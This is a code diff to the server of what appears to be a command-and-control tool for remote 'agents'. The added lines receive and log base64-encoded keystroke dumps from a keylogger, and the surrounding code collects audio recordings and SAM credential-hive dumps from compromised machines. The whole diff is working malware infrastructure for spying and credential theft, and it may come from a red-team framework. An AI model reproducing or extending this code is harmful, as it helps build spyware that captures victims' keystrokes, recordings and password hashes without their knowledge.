@@ -73,6 +73,15 @@ class C2(BaseHTTPRequestHandler):
                 utils.log_message(f"Downloaded audio recording from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
+        elif command_type in ["keylog-dump", "keylog-stop"] and "keystrokes_base64" in agent_data["data"]:
+            keystrokes = utils.decode_base_64(agent_data["data"]["keystrokes_base64"], encoding="utf-8")
+            if isinstance(keystrokes, bytes):
+                keystrokes = keystrokes.decode(errors='ignore')
+            utils.log_message(f"keystrokes dump from agent {agent}")
+            utils.log_message(keystrokes, print_time=False)
+            if 'status' in agent_data['data']:
+                utils.log_message(f"[*] status: {agent_data['data']['status']}", print_time=False)
+
         elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(collect_folder, agent, "sam_{}".format(datetime.now().strftime(file_save_strftime)))
             sam_path = os.path.join(save_path, "sam")
@@ -95,7 +104,7 @@ class C2(BaseHTTPRequestHandler):
                     "pending_commands": []
                 }
 
-            utils.log_message(f"[*] Collected data from agent {agent} [command: {command_type}]")
+            utils.log_message(f"Collected data from agent {agent} [command: {command_type}]")
 
         else:
             utils.log_message(f"Data from agent {agent} [command: {command_type}]")
